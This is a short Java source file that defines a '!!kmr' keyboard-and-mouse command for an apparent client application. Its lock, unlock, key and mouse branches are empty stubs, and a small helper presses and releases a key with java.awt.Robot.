package com.ghostj.client.func;

import com.ghostj.client.cmd.AbstractFunc;
import com.ghostj.client.cmd.AbstractProcessor;

import java.awt.*;

import static java.lang.Thread.sleep;

public class FuncKMR implements AbstractFunc {
	@Override
	public String getFuncName() {
		return "!!kmr";
	}

	@Override
	public String[] getParamsModel() {
		return new String[0];
	}

	@Override
	public String getDescription() {
		return "keyboard and mouse robot";
	}

	@Override
	public int getMinParamsAmount() {
		return 1;
	}

	@Override
	public void run(String[] params, String cmd, AbstractProcessor processor) {
		if(params[0].equalsIgnoreCase("unlock")){

		}else if(params[0].equalsIgnoreCase("lock")){

		}else if(params[0].equalsIgnoreCase("key")){

		}else if(params[0].equalsIgnoreCase("mouse")){

		}
	}
	public void clickKey(int key,int last)throws Exception{
		Robot robot=new Robot();
		robot.keyPress(key);
		sleep(last);
		robot.keyRelease(key);
	}
}
